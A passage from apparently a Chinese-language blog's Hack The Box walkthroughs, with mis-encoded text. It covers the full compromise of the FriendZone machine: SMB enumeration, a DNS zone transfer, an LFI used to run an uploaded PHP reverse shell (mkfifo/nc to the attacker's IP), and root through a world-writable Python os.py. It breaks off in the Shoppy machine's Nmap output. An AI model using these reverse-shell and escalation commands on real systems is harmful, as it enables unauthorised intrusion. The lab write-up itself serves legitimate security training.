Apache httpd 2.4.29\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO\n| Not valid before: 2018-10-05T21:02:30\n|_Not valid after:  2018-11-04T21:02:30\n|_http-title: 404 Not Found\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=9/9%OT=21%CT=1%CU=36793%PV=Y%DS=2%DC=T%G=Y%TM=631ACC10\nOS:%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=\nOS:A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M5\nOS:39ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712\nOS:0)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S\nOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=\nOS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%\nOS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%\nOS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=\nOS:40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: -1h00m00s, deviation: 1h43m54s, median: -1s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: friendzone\n|   NetBIOS computer name: FRIENDZONE\\x00\n|   Domain name: \\x00\n|   FQDN: friendzone\n|_  System time: 2022-09-09T08:15:47+03:00\n| smb2-time: \n|   date: 2022-09-09T05:15:49\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   277.35 ms 10.10.14.1\n2   277.61 ms 10.10.10.123\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.57 seconds\n```\n## Http\n![](Hackthebox-FriendZone/9a965834-fcb3-4978-962c-2f4e60dbed20.png)\n\nå°±ä¸€å¼ é™æ€å›¾ç‰‡ï¼Œè‚¯å®šä¸åœ¨è¿™é‡Œäº†\n\n## Ftp\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ftp 10.10.10.123\nConnected to 10.10.10.123.\n220 (vsFTPd 3.0.3)\nName (10.10.10.123:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n```\næœ¬å°ä¸å…è®¸ ftp åŒ¿åç™»é™†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# searchsploit vsftpd 3.0.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 3.0.3 - Remote Denial of Service                                                                                                                                                                   | multiple/remote/49719.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nExploit-DB ä¹Ÿåªæ‰¾åˆ°ä¸€ä¸ªè¿œç¨‹DDOSçš„æ¼æ´ï¼Œæ²¡ä»€ä¹ˆå®é™…æ„ä¹‰\n\n## Samba\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# smbmap -H 10.10.10.123\n[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files\n        general                                                 READ ONLY       FriendZone Samba Server Files\n        Development                                             READ, WRITE     FriendZone Samba Server Files\n        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# smbclient --list 10.10.10.123 -U \"\"  \nPassword for [WORKGROUP\\]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        Files           Disk      FriendZone Samba Server Files /etc/Files\n        general         Disk      FriendZone Samba Server Files\n        Development     Disk      FriendZone Samba Server Files\n        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            -------\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            FRIENDZONE\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -p 445 --script=smb-enum-shares 10.10.10.123\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 09:50 CST\nNmap scan report for 10.10.10.123\nHost is up (1.2s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-enum-shares: \n|   account_used: guest\n|   \\\\10.10.10.123\\Development: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\Development\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.10.123\\Files: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files /etc/Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\hole\n|     Anonymous access: <none>\n|     Current user access: <none>\n|   \\\\10.10.10.123\\IPC$: \n|     Type: STYPE_IPC_HIDDEN\n|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))\n|     Users: 1\n|     Max Users: <unlimited>\n|     Path: C:\\tmp\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.10.123\\general: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\general\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.10.123\\print$: \n|     Type: STYPE_DISKTREE\n|     Comment: Printer Drivers\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\var\\lib\\samba\\printers\n|     Anonymous access: <none>\n|_    Current user access: <none>\n\nNmap done: 1 IP address (1 host up) scanned in 95.19 seconds\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# smbclient -N \\\\\\\\10.10.10.123\\\\Development\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Tue Sep 20 09:51:26 2022\n  ..                                  D        0  Tue Sep 13 22:56:24 2022\n\n                3545824 blocks of size 1024. 1658488 blocks available\n```\nå››å¤§å¸¸ç”¨æŒ‡ä»¤æŒ¨ä¸ªæ‰§è¡Œä¸€éï¼Œæ‹¿åˆ°çš„ä¿¡æ¯è¶Šå¤šè¶Šå¥½\n\nDevelopment æ–‡ä»¶å¤¹æ˜¯ç©ºçš„ï¼Œçœ‹çœ‹å¦ä¸€ä¸ªæœ‰è¯»å–æƒé™çš„æ–‡ä»¶å¤¹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# smbclient -N \\\\\\\\10.10.10.123\\\\general\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Jan 17 04:10:51 2019\n  ..                                  D        0  Tue Sep 13 22:56:24 2022\n  creds.txt                           N       57  Wed Oct 10 07:52:42 2018\n\n                3545824 blocks of size 1024. 1658484 blocks available\n```\nè¿™è¾¹æœ‰ä¸€ä¸ª creds.txt æ–‡ä»¶ï¼Œè¯»å–çœ‹ä¸€ä¸‹\n\n```bash\ncreds for the admin THING:\n\nadmin:WORKWORKHhallelujah@#\n```\nä¼¼ä¹æ˜¯ä¸€ä¸ªè´¦å·å¯†ç \n\n# æ¼æ´åˆ©ç”¨\næˆ‘ä»¬å›åˆ° Http é¡µé¢ï¼Œä¼šçœ‹åˆ°æœ‰ä¸€ä¸ªé‚®ç®± info@friendzoneportal.red\n\næ—¢ç„¶æ˜¯åŸŸåé‚®ç®±ï¼Œé‚£æŒ‰ç…§å¸¸ç†æ¥è¯´æ˜¯ä¼šå­˜åœ¨è¿™ä¸ªåŸŸåçš„\n\n![](Hackthebox-FriendZone/33882849-1ab7-46b1-8438-122572d089ce.png)\n\næŸ¥çœ‹äº†ä¸€ä¸‹è¯ä¹¦ï¼Œå‘ç°ç¡®å®å­˜åœ¨åŸŸåï¼Œä½†æ˜¯æ˜¯ friendzone.redï¼Œå»æ·»åŠ ä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.10.123 friendzone.red >> /etc/hosts\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# dig axfr friendzone.red @10.10.10.123\n\n; <<>> DiG 9.18.1-1-Debian <<>> axfr friendzone.red @10.10.10.123\n;; global options: +cmd\nfriendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\nfriendzone.red.         604800  IN      AAAA    ::1\nfriendzone.red.         604800  IN      NS      localhost.\nfriendzone.red.         604800  IN      A       127.0.0.1\nadministrator1.friendzone.red. 604800 IN A      127.0.0.1\nhr.friendzone.red.      604800  IN      A       127.0.0.1\nuploads.friendzone.red. 604800  IN      A       127.0.0.1\nfriendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\n;; Query time: 1439 msec\n;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)\n;; WHEN: Tue Sep 20 10:09:07 CST 2022\n;; XFR size: 8 records (messages 1, bytes 289)\n```\næšä¸¾åŸŸåä¿¡æ¯ï¼Œå‘ç°äº†ä¸‰ä¸ªå­åŸŸå\n\n```bash\nadministrator1.friendzone.red hr.friendzone.red uploads.friendzone.red\n```\néƒ½æ·»åŠ åˆ° hosts\n\n[https://administrator1.friendzone.red/](https://administrator1.friendzone.red/) è®¿é—®åå‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢\n\n![](Hackthebox-FriendZone/dfc2d5f6-36c9-457e-9a31-3873c5e44667.png)\n\nä½¿ç”¨æˆ‘ä»¬çš„è´¦å·å¯†ç è¿›è¡Œç™»å½•\n\n![](Hackthebox-FriendZone/fa0b0178-107c-47af-8f93-38c738a1892d.png)\n\nç™»é™†æˆåŠŸï¼Œè®©æˆ‘ä»¬è®¿é—® /dashboard.php\n\n![](Hackthebox-FriendZone/212b0b2e-9469-4660-a090-c08b0dae4a17.png)\n\nå¤§æ¦‚æ„æ€æ˜¯è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºæœ‹å‹åœˆçš„æ™ºèƒ½ç…§ç‰‡è„šæœ¬ï¼Œä½†æ˜¯è¿™æ˜¯ä¸€ä¸ªåˆçº§çš„ php å¼€å‘äººå‘˜å†™çš„ä»£ç ï¼Œç„¶åè¿™ä¸ªè„šæœ¬è¿˜æ²¡ç»è¿‡æµ‹è¯•ï¼Œæ‰€ä»¥æœ‰ä¸€ä¸ªå‚æ•°è¢«é—å¿˜äº†ï¼Œè¾“å…¥è¿™ä¸ªå‚æ•°å¯ä»¥ç°å®å›¾ç‰‡ï¼Œé»˜è®¤æ˜¯ image\\_id=a.jpg&pagename=timestamp\n\n![](Hackthebox-FriendZone/6a033764-ad5a-41e1-94a6-dfaad1d72b43.png)\n\nçœ‹åˆ°è¿™å‚æ•°æ„æˆï¼Œæ„Ÿè§‰å­˜åœ¨ LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰ï¼Œç„¶ååœ¨ä¹‹å‰çš„ Development å¤„ï¼Œæ„Ÿè§‰æœ‰ç‚¹ä¸å¯¹ï¼Œä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å´æ²¡æœ‰å†…å®¹ï¼Œåº”è¯¥æ˜¯ç»™æˆ‘ä»¬ä¸Šä¼ çš„ç‚¹ã€‚ç„¶åæˆ‘ä»¬ä¹ŸçŸ¥é“å®ƒçš„ç»å¯¹è·¯å¾„ï¼Œå»å°è¯•ä¸Šä¼ åˆ° Developmentï¼Œå†å» LFI è¯»å–è¯•è¯•\n\n```bash\n\\\\10.10.10.123\\Development: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\Development\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n```\n```bash\n<?php\nsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f');\n?>\n```\næŠŠ shell å†™å…¥åˆ° php æ–‡ä»¶ï¼Œç„¶åå»ä¸Šä¼ \n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# smbclient //10.10.10.123/development -U \"\"\nPassword for [WORKGROUP\\]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> put shell.php \nputting file shell.php as \\shell.php (0.1 kb/s) (average 0.1 kb/s)\n```\nç„¶åå»åŒ…å«è¯•è¯•\n\n```bash\nnc -nvlp 4444\n```\n```bash\nhttps://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                    \nlistening on [any] 4444 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.10.10.123] 39570\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\nwww-data@FriendZone:/var/www/admin$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸè·å¾— shel\n\n```bash\nwww-data@FriendZone:/home/friend$ cat user.txt\ncat user.txt\na4977797fce2cc139c86af2adc340a29\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n## User\n```bash\nwww-data@FriendZone:/var/www$ ls\nls\nadmin       friendzoneportal       html             uploads\nfriendzone  friendzoneportaladmin  mysql_data.conf\nwww-data@FriendZone:/var/www$ cat mysql_data.conf\ncat mysql_data.conf\nfor development process this is the mysql creds for user friend\n\ndb_user=friend\n\ndb_pass=Agpyu12!0.213$\n\ndb_name=FZ\n```\nåœ¨ç™»å…¥åçš„ç›®å½•æ‰¾åˆ°äº†ä¸€ä¸ª mysql\\_data.conf æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›å‡­è¯\n\n```bash\nww-data@FriendZone:/var/www$ cat /etc/passwd|grep bash\ncat /etc/passwd|grep bash\nroot:x:0:0:root:/root:/bin/bash\nfriend:x:1000:1000:friend,,,:/home/friend:/bin/bash\n```\nå¯ä»¥çœ‹åˆ°å½“å‰ä¹Ÿæœ‰è¿™ä¸ªç”¨æˆ·ï¼Œå»å°è¯• ssh ç™»é™†è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ssh friend@10.10.10.123\nThe authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.\nED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.123' (ED25519) to the list of known hosts.\nfriend@10.10.10.123's password: \nWelcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nYou have mail.\nLast login: Thu Jan 24 01:20:15 2019 from 10.10.14.3\nfriend@FriendZone:~$ whoami&&id\nfriend\nuid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)\n```\nç™»å…¥æˆåŠŸ\n\n## Root\nä½¿ç”¨ pspy64 è·‘ä¸€ä¸‹\n\n```bash\n2022/09/20 05:44:01 CMD: UID=0    PID=1417   | /bin/sh -c /opt/server_admin/reporter.py \n2022/09/20 05:44:01 CMD: UID=0    PID=1416   | /bin/sh -c /opt/server_admin/reporter.py\n```\nå‘ç°æœ‰ä¸€ä¸ªè„šæœ¬ /opt/server\\_admin/reporter.py ä¸€ç›´åœ¨è¿è¡Œ\n\n```bash\nfriend@FriendZone:~$ ls -la /opt/server_admin/reporter.py\n-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py\n```\nå¹¶ä¸”è¿˜æ˜¯ root æƒé™çš„\n\n```bash\nfriend@FriendZone:~$ cat /opt/server_admin/reporter.py\n#!/usr/bin/python\n\nimport os\n\nto_address = \"admin1@friendzone.com\"\nfrom_address = \"admin2@friendzone.com\"\n\nprint \"[+] Trying to send email to %s\"%to_address\n\n#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"'''\n\n#os.system(command)\n\n# I need to edit the script later\n# Sam ~ python developer\n```\næˆ‘ä»¬æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯å®ƒä¼šå¯¼å…¥ä¸€ä¸ª os åº“ï¼Œå’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰æƒé™\n\n```bash\nfriend@FriendZone:/usr/lib/python2.7$ ls -la|grep os.py\n-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py\n```\nå’±ä»¬æ˜¯æœ‰å†™å…¥æƒé™çš„ï¼Œé‚£å°±å†™å…¥ä¸€æ®µæ¶æ„ç¨‹åºå°±å¥½äº†\n\n```bash\necho \"system('chmod +s /bin/bash')\" >> os.py\n```\n```bash\nfriend@FriendZone:/usr/lib/python2.7$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash\n```\nç­‰å¾…ä¸¤åˆ†é’Ÿï¼Œçœ‹åˆ°åŠ ä¸Š s æƒé™åï¼Œå°±å¯ä»¥ææƒäº†\n\n```bash\nfriend@FriendZone:/usr/lib/python2.7$ /bin/bash -p\nbash-4.4# whoami&&id\nroot\nuid=1000(friend) gid=1000(friend) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(friend)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nbash-4.4# cat /root/root.txt\nd93cbc3ed65646042735f3ee312fe2c5\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Shoppy - Hackthebox","url":"/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/","content":"\n# Hackthebox - Shoppy\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-Shoppy/sMP6VyYQsVBPHnpOtxvXg5zHVcvJK_iZMEZiD6H4LF8.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-Shoppy/_njbcZuolm5NBBnlKHDNrUwsD_OIuUJuvBRpvmLm4A4.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.180\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 20:59 EST\nNmap scan report for 10.10.11.180\nHost is up (0.25s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)\n|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)\n|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)\n80/tcp   open  http     nginx 1.23.1\n|_http-title: Did not follow redirect to http://shoppy.htb\n|_http-server-header: nginx/1.23.1\n9093/tcp open  copycat?\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/plain; version=0.0.4; charset=utf-8\n|     Date: Thu, 22 Dec 2022 01:59:42 GMT\n|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.\n|     TYPE go_gc_cycles_automatic_gc_cycles_total counter\n|     go_gc_cycles_automatic_gc_cycles_total 2612\n|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.\n|     TYPE go_gc_cycles_forced_gc_cycles_total counter\n|     go_gc_cycles_forced_gc_cycles_total 0\n|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.\n|     TYPE go_gc_cycles_total_gc_cycles_total counter\n|     go_gc_cycles_total_gc_cycles_total 2612\n|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n|     TYPE go_gc_duration_seconds summary\n|     go_gc_duration_seconds{quantile=\"0\"} 4.218e-05\n|     go_gc_duration_seconds{quantile=\"0.25\"} 0.000107572\n|   HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/plain; version=0.0.4; charset=utf-8\n|     Date: Thu, 22 Dec 2022 01:59:43 GMT\n|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.\n|     TYPE go_gc_cycles_automatic_gc_cycles_total counter\n|     go_gc_cycles_automatic_gc_cycles_total 2612\n|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.\n|     TYPE go_gc_cycles_forced_gc_cycles_total counter\n|     go_gc_cycles_forced_gc_cycles_total 0\n|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.\n|     TYPE go_gc_cycles_total_gc_cycles_total counter\n|     go_gc_cycles_total_gc_cycles_total 2612\n|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n|     TYPE go_gc_duration_seconds summary\n|     go_gc_duration_seconds{quantile=\"0\"} 4.218e-05\n|_    go_gc_duration_seconds{quantile=\"0.25\"} 0.000107572\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9093-TCP:V=7.93%I=7%D=12/21%Time=63A3BA0E%P=x86_64-pc-linux-gnu%r(G\nSF:enericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20\nSF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\\nSF:x20Request\")%r(GetRequest,2F0E,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\nSF:\\x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Thu,\\x\nSF:2022\\x20Dec\\x202022\\x2001:59:42\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles\nSF:_automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\\nSF:x20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles\nSF:_automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles\nSF:_total\\x202612\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Cou\nSF:nt\\x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applica\nSF:tion\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo\nSF:_gc_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total\nSF:_gc_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n\nSF:#\\x20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycle\nSF:s_total_gc_cycles_total\\x202612\\n#\\x20HELP\\x20go_gc_duration_seconds\\x2\nSF:0A\\x20summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20col\nSF:lection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo\nSF:_gc_duration_seconds{quantile=\\\"0\\\"}\\x204\\.218e-05\\ngo_gc_duration_seco\nSF:nds{quantile=\\\"0\\.25\\\"}\\x200\\.000107572\\ngo_\")%r(HTTPOptions,2A5A,\"HTTP\nSF:/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\\nSF:x20charset=utf-8\\r\\nDate:\\x20Thu,\\x2022\\x20Dec\\x202022\\x2001:59:43\\x20G\nSF:MT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\\nSF:x20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20r\nSF:untime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counte\nSF:r\\ngo_gc_cycles_automatic_gc_cycles_total\\x202612\\n#\\x20HELP\\x20go_gc_c\nSF:ycles_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycle\nSF:s\\x20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_fo\nSF:rced_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x2\nSF:00\\n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20a\nSF:ll\\x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_c\nSF:ycles_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x202612\\n#\\x\nSF:20HELP\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\\nSF:x20duration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go\nSF:_gc_duration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\\"0\\\"}\nSF:\\x204\\.218e-05\\ngo_gc_duration_seconds{quantile=\\\"0\\.25\\\"}\\x200\\.000107\nSF:572\\ngo_\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=41733%PV=Y%DS=2%DC=T%G=Y%TM=63A3BA\nOS:84%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST\nOS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   276.37 ms 10.10.14.1\n2   276.85 ms 10.10.11.180\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 150.68 seconds\n```\nè¿™é‡Œä¸€çœ‹å°±éœ€è¦åš hosts 